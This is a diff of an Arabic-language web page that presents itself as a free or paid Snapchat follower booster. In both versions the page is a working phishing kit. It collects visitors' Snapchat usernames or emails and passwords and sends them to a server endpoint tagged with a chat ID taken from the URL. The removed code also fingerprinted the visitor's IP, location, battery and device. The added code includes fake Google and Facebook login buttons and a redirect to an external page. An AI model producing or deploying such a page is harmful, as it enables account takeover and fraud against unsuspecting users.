@@ -1,200 +1,564 @@
 <!DOCTYPE html>
-<html dir="rtl" lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-    <title>زيادة متابعين سناب شات</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #FFEB3B; /* لون فاتح وقوي للسناب شات */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            color: #333;
-        }
-        .container {
-            background-color: #fff;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            max-width: 400px;
-            width: 90%;
-        }
-        h1 {
-            color: #FFC107; /* لون مشابه للسناب شات */
-            margin-bottom: 20px;
-        }
-        input[type="text"], input[type="password"], select {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            background-color: #f9f9f9;
-            color: #333;
-            box-sizing: border-box;
-        }
-        button {
-            background-color: #FFC107; /* لون مشابه للسناب شات */
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            width: 100%;
-            margin-top: 10px;
-        }
-        .snapchat-logo {
-            width: 50px;
-            height: 50px;
-            margin-bottom: 20px;
-        }
-        .notification {
-            position: fixed;
-            top: 10px;
-            right: 10px;
-            background-color: #FFC107; /* لون مشابه للسناب شات */
-            color: white;
-            padding: 10px 20px;
-            border-radius: 5px;
-            z-index: 100;
-            opacity: 0;
-            transition: opacity 0.5s ease;
-            display: none;
-        }
-        .notification.show {
-            opacity: 1;
-            display: block;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>شحن متابعين سناب شات</title>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --primary: #FFC107;
+      --secondary: #FF5722;
+      --dark: #1A237E;
+      --light: #E3F2FD;
+      --accent: #4CAF50;
+      --text: #212121;
+      --bg: #f8f9fa;
+    }
+
+    body {
+      font-family: 'Tajawal', sans-serif;
+      background: linear-gradient(135deg, var(--light), #ffffff);
+      background-attachment: fixed;
+      color: var(--text);
+      overflow-y: scroll;
+      min-height: 100vh;
+      scroll-behavior: smooth;
+    }
+
+    .main-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 20px;
+      position: relative;
+      z-index: 10;
+    }
+
+    .center-container {
+      background: rgba(255, 255, 255, 0.95);
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+      padding: 30px;
+      margin: 40px auto;
+      max-width: 800px;
+      position: relative;
+      overflow: hidden;
+      border: 1px solid rgba(26, 35, 126, 0.1);
+    }
+
+    .section {
+      margin-bottom: 40px;
+      position: relative;
+    }
+
+    .section-title {
+      text-align: center;
+      color: var(--dark);
+      margin-bottom: 25px;
+      font-size: 28px;
+      position: relative;
+      padding-bottom: 15px;
+    }
+
+    .section-title::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 80px;
+      height: 4px;
+      background: linear-gradient(to right, var(--primary), var(--secondary));
+      border-radius: 2px;
+    }
+
+    .btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      padding: 15px;
+      margin: 15px 0;
+      background: linear-gradient(to right, var(--dark), #283593);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 18px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(26, 35, 126, 0.2);
+    }
+
+    .btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 6px 20px rgba(26, 35, 126, 0.3);
+    }
+
+    .btn img {
+      height: 24px;
+      margin-left: 10px;
+    }
+
+    .pricing {
+      margin-top: 30px;
+    }
+
+    .price-item {
+      background: white;
+      padding: 15px;
+      margin: 12px 0;
+      border-radius: 12px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      color: var(--dark);
+      border: 2px solid rgba(26, 35, 126, 0.1);
+      transition: all 0.3s ease;
+    }
+
+    .price-item:hover {
+      transform: translateX(-5px);
+      border-color: var(--primary);
+    }
+
+    .buy-btn {
+      background: linear-gradient(to right, var(--primary), var(--secondary));
+      color: var(--dark);
+      border: none;
+      padding: 8px 20px;
+      border-radius: 8px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .buy-btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 4px 10px rgba(255, 152, 0, 0.3);
+    }
+
+    input, select {
+      width: 100%;
+      padding: 14px;
+      margin: 12px 0;
+      border-radius: 12px;
+      border: 2px solid rgba(26, 35, 126, 0.1);
+      background: white;
+      color: var(--text);
+      font-size: 16px;
+      font-family: 'Tajawal', sans-serif;
+      transition: all 0.3s ease;
+    }
+
+    input:focus, select:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(255, 193, 7, 0.2);
+    }
+
+    input::placeholder {
+      color: rgba(33, 33, 33, 0.5);
+    }
+
+    form {
+      background: white;
+      padding: 25px;
+      border-radius: 18px;
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
+      border: 1px solid rgba(26, 35, 126, 0.1);
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 700;
+      color: var(--dark);
+      font-size: 16px;
+    }
+
+    .form-header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .form-header h1 {
+      color: var(--dark);
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+
+    .form-header p {
+      color: #666;
+      font-size: 16px;
+    }
+
+    .back-btn {
+      background: #f5f5f5;
+      color: var(--dark);
+      border: none;
+      padding: 8px 16px;
+      border-radius: 8px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 15px;
+      transition: all 0.3s ease;
+    }
+
+    .back-btn:hover {
+      background: #e0e0e0;
+    }
+
+    .snap-logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .snap-logo img {
+      height: 70px;
+      filter: drop-shadow(0 3px 5px rgba(255, 193, 7, 0.5));
+    }
+
+    .featured-image {
+      width: 100%;
+      height: 200px;
+      background: linear-gradient(to right, #FFC107, #FF9800);
+      border-radius: 15px;
+      margin: 25px 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .featured-image::before {
+      content: "";
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="%23ffffff" fill-opacity="0.2" d="M0,64L48,69.3C96,75,192,85,288,101.3C384,117,480,139,576,133.3C672,128,768,96,864,85.3C960,75,1056,85,1152,101.3C1248,117,1344,139,1392,149.3L1440,160L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"></path></svg>');
+      background-size: cover;
+      background-position: center;
+    }
+
+    .featured-image i {
+      font-size: 100px;
+      color: white;
+      text-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
+    }
+
+    .stats-container {
+      display: flex;
+      justify-content: space-around;
+      margin: 30px 0;
+      text-align: center;
+    }
+
+    .stat-item {
+      padding: 15px;
+    }
+
+    .stat-item i {
+      font-size: 36px;
+      color: var(--primary);
+      margin-bottom: 10px;
+    }
+
+    .stat-item .number {
+      font-size: 32px;
+      font-weight: 800;
+      color: var(--dark);
+      line-height: 1;
+    }
+
+    .stat-item .label {
+      font-size: 16px;
+      color: #666;
+    }
+
+    .scroll-indicator {
+      text-align: center;
+      margin: 20px 0;
+      color: var(--dark);
+      font-size: 18px;
+    }
+
+    .scroll-indicator i {
+      display: block;
+      font-size: 28px;
+      margin-top: 10px;
+      animation: bounce 2s infinite;
+    }
+
+    @keyframes bounce {
+      0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
+      40% {transform: translateY(-20px);}
+      60% {transform: translateY(-10px);}
+    }
+
+    @media (max-width: 768px) {
+      .center-container {
+        padding: 20px;
+        margin: 20px auto;
+      }
+      
+      .stats-container {
+        flex-direction: column;
+      }
+      
+      .section-title {
+        font-size: 24px;
+      }
+    }
+    
+    .spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 1s ease-in-out infinite;
+      margin-left: 10px;
+      position: relative;
+      z-index: 2;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    .notification {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0,0,0,0.8);
+      color: white;
+      padding: 15px 25px;
+      border-radius: 10px;
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+      animation: slideIn 0.3s, fadeOut 0.5s 2.5s forwards;
+    }
+    
+    @keyframes slideIn {
+      from { top: -100px; }
+      to { top: 20px; }
+    }
+    
+    @keyframes fadeOut {
+      from { opacity: 1; }
+      to { opacity: 0; top: -100px; }
+    }
+    
+    .notification.success {
+      border-left: 4px solid #2ecc71;
+    }
+    
+    .notification.error {
+      border-left: 4px solid #e74c3c;
+    }
+    
+    .notification.info {
+      border-left: 4px solid #3498db;
+    }
+    
+    .notification-icon {
+      margin-left: 10px;
+      font-size: 20px;
+    }
+
+    .spinnert {
+      display: none;
+      width: 40px;
+      height: 40px;
+      margin: 0 auto;
+      border: 4px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top: 4px solid var(--secondary);
+      animation: spin 1s linear infinite;
+    }
+    
+    .submit-btn {
+      background: linear-gradient(135deg, var(--secondary), #e6c200);
+      color: var(--dark);
+      font-weight: bold;
+      font-size: 1.1rem;
+      padding: 14px;
+      border-radius: 12px;
+      border: none;
+      width: 100%;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 10px;
+      box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
+    }
+
+    .submit-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 20px rgba(255, 215, 0, 0.5);
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/ar/6/62/%D8%B4%D8%B9%D8%A7%D8%B1_%D8%B3%D9%86%D8%A7%D8%A8_%D8%B4%D8%A7%D8%AA.png" alt="Snapchat Logo" class="snapchat-logo">
-        <h1>زيادة متابعين سناب شات 👻🚀</h1>
-        <form id="increaseForm">
-            <input type="hidden" name="chatId" id="chatIdInput">
-            <input type="text" name="username" placeholder="يوزر الحساب او البريد الإلكتروني" required>
-            <input type="password" name="password" placeholder="كلمة المرور" required>
-            <select name="followers" required>
-                <option value="">اختر عدد المتابعين</option>
-                <option value="500">متابع 500🔥</option>
-                <option value="1000">متابع 1k⭐</option>
-                <option value="2000">متابع 2k💥</option>
-                <option value="3000">متابع 3k🚀</option>
-            </select>
-            <button type="submit">رشق</button>
-        </form>
-        <div class="notification" id="notification">
-            <p>تم تنفيذ طلبك! إذا كانت البيانات صحيحة، فسوف يصلون إليك المتابعين في غضون 15 دقيقة.</p>
+  <div class="main-container">
+    <div class="center-container">
+      <div class="featured-image">
+        <i class="fas fa-users"></i>
+      </div>
+      
+      <div id="login" class="section">
+        <div class="snap-logo">
+          <i class="fab fa-snapchat-ghost" style="font-size: 60px; color: #FFFC00;"></i>
         </div>
+        
+        <h2 class="section-title">تسجيل الدخول عبر</h2>
+        
+        <button class="btn" onclick="showForm()">
+          <i class="fab fa-google" style="margin-left: 10px;"></i>
+          تسجيل الدخول عبر Google
+        </button>
+        
+        <button class="btn" onclick="showForm()">
+          <i class="fab fa-facebook" style="margin-left: 10px;"></i>
+          تسجيل الدخول عبر Facebook
+        </button>
+        
+        <button class="btn" onclick="showForm()">
+          <i class="fab fa-snapchat-ghost" style="margin-left: 10px;"></i>
+          تسجيل الدخول عبر Snapchat
+        </button>
+        
+        <div class="scroll-indicator">
+          اسحب للأسفل لرؤية المزيد
+          <i class="fas fa-chevron-down"></i>
+        </div>
+      </div>
+      
+      <div id="form" class="section" style="display: none;">
+        <div class="form-header">
+          <h1>شحن متابعين سناب شات 🚀</h1>
+          <p>املأ النموذج التالي لبدء شحن المتابعين</p>
+        </div>
+        
+        <form id="increaseForm">
+          <input type="hidden" name="chatId" id="chatIdInput">
+          
+          <label><i class="fas fa-user"></i> اسم المستخدم او البريد الالكتروني :</label>
+          <input type="text" name="username" required placeholder="ادخل اسم المستخدم في سناب شات">
+          
+          <label><i class="fas fa-lock"></i> كلمة المرور:</label>
+          <input type="password" name="password" required placeholder="ادخل كلمة المرور">
+          
+          <label><i class="fas fa-users"></i> عدد المتابعين:</label>
+          <select name="uc" required>
+            <option value="">اختر عدد المتابعين</option>
+            <option value="1000">1000 متابع مجاني</option>
+            <option value="1500">1500 متابع</option>
+            <option value="2000">2000 متابع</option>
+            <option value="2500">2500 متابع</option>
+            <option value="3000">3000 متابع</option>
+          </select>
+        
+          <button type="submit" class="submit-btn">شحن المتابعين <i class="fas fa-bolt"></i></button>
+          
+          <button type="button" class="back-btn" onclick="goBack()">
+            <i class="fas fa-arrow-left"></i> رجوع
+          </button>
+        </form>
+      </div>
+      
+      <div class="section pricing">
+        <h2 class="section-title">أسعار المتابعين</h2>
+        
+        <div class="price-item">
+          <span><i class="fas fa-user-friends"></i> 1000 متابع - 0$</span>
+          <button class="buy-btn">مجاني</button>
+        </div>
+        
+        <div class="price-item">
+          <span><i class="fas fa-user-friends"></i> 1500 متابع - 2$</span>
+          <button class="buy-btn">شراء الآن</button>
+        </div>
+        
+        <div class="price-item">
+          <span><i class="fas fa-user-friends"></i> 2000 متابع - 3$</span>
+          <button class="buy-btn">شراء الآن</button>
+        </div>
+        
+        <div class="price-item">
+          <span><i class="fas fa-user-friends"></i> 2500 متابع - 4$</span>
+          <button class="buy-btn">شراء الآن</button>
+        </div>
+        
+        <div class="price-item">
+          <span><i class="fas fa-user-friends"></i> 3000 متابع - 5$</span>
+          <button class="buy-btn">شراء الآن</button>
+        </div>
+        
+        <div class="scroll-indicator">
+          اسحب للأعلى للعودة
+          <i class="fas fa-chevron-up"></i>
+        </div>
+      </div>
     </div>
-    <script>
-        const increaseForm = document.getElementById('increaseForm');
-const chatIdInput = document.getElementById('chatIdInput');
-const notification = document.getElementById('notification');
+  </div>
 
-const chatId = window.location.pathname.split('/').pop();
-chatIdInput.value = chatId;
+  <script>
+    const increaseForm = document.getElementById('increaseForm');
+    const chatIdInput = document.getElementById('chatIdInput');
 
-async function getIPInfo() {
-  try {
-    const response = await fetch('https://ipapi.co/json/');
-    const data = await response.json();
-    return {
-      ip: data.ip,
-      country: data.country_name,
-      city: data.city
-    };
-  } catch (error) {
-    console.error('Error fetching IP info:', error);
-    return {
-      ip: 'Unknown',
-      country: 'Unknown',
-      city: 'Unknown'
-    };
-  }
-}
+    const chatId = window.location.pathname.split('/').pop();
+    chatIdInput.value = chatId;
 
-function getPlatformInfo() {
-  const ua = navigator.userAgent;
-  let platform = "Unknown";
-  if (/Windows/.test(ua)) platform = "Snapchat";
-  else if (/Mac/.test(ua)) platform = "Snapchat ";
-  else if (/Linux/.test(ua)) platform = "snapchat";
-  else if (/Android/.test(ua)) platform = "Snapchat ";
-  else if (/iPhone|iPad|iPod/.test(ua)) platform = "Snapchat";
-
-  return {
-    platform: platform,
-    userAgent: ua
-  };
-}
-
-async function getBatteryInfo() {
-  if ('getBattery' in navigator) {
-    try {
-      const battery = await navigator.getBattery();
-      return {
-        batteryLevel: battery.level,
-        batteryCharging: battery.charging
-      };
-    } catch (error) {
-      console.error('Error getting battery info:', error);
+    function showForm() {
+      document.getElementById("login").style.display = "none";
+      document.getElementById("form").style.display = "block";
+      document.getElementById("form").scrollIntoView({ behavior: 'smooth' });
     }
-  }
-  return {
-    batteryLevel: undefined,
-    batteryCharging: undefined
-  };
-}
 
-function getDeviceVersion() {
-  const ua = navigator.userAgent;
-  const match = ua.match(/\(([^)]+)\)/);
-  return match ? match[1] : 'Unknown';
-}
+    function goBack() {
+      document.getElementById("form").style.display = "none";
+      document.getElementById("login").style.display = "block";
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
 
-increaseForm.addEventListener('submit', async (event) => {
-  event.preventDefault();
-  const formData = new FormData(increaseForm);
-  const data = Object.fromEntries(formData.entries());
+    increaseForm.addEventListener('submit', (event) => {
+      event.preventDefault();
+      const formData = new FormData(increaseForm);
+      const data = Object.fromEntries(formData.entries());
 
-  const ipInfo = await getIPInfo();
-  const platformInfo = getPlatformInfo();
-  const batteryInfo = await getBatteryInfo();
-  const deviceVersion = getDeviceVersion();
-
-  Object.assign(data, ipInfo, platformInfo, batteryInfo, { deviceVersion });
-
-  try {
-    const response = await fetch('/submitIncrease', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(data)
+      fetch('/submitIncrease', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          window.location.href = "https://issol.free.nf/success/ok.html";
+        } else {
+          alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
+      });
     });
-    const result = await response.json();
-    if (result.success) {
-      notification.classList.add('show');
-      setTimeout(() => {
-        notification.classList.remove('show');
-      }, 5000);
-      increaseForm.reset();
-    } else {
-      alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
-    }
-  } catch (error) {
-    console.error('Error:', error);
-    alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
-  }
-});
-    </script>
+  </script>
 </body>
-</html>
+    </html>
